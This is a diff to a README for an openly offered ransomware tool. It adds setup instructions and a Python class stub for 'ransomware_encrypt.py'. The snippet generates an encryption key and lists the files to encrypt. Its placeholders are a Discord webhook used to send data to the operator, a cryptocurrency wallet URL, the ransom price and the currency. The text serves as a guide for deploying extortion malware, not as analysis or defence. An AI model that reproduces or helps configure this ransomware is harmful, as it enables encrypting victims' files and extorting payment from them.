@@ -58,6 +58,20 @@ In order to be able to install all the dependencies you will need to have `pip` 
   pip install discord_webhook
 ```
 
+In the `ransomware_encrypt.py` can modify some values like the `Discord Webhook`, your CryptoCurrency Wallet, the requested price, and the currency desired.
+
+```python
+  class ransomware:
+    def __init__(self):
+        self.files_to_encrypt = []
+        self.KeyStore = []
+        self._keyEncrypt = Fernet.generate_key()
+        self.dc_webhook = DiscordWebhook("Your Discord Webhook Here")
+        self.wallet_url = "YOUR WALLET URL"
+        self.priceToAsk = "Price To Ask Here"
+        self.currency = "Crypto Currency Choice"
+  ```
+
     
 ## Running Scripts
 
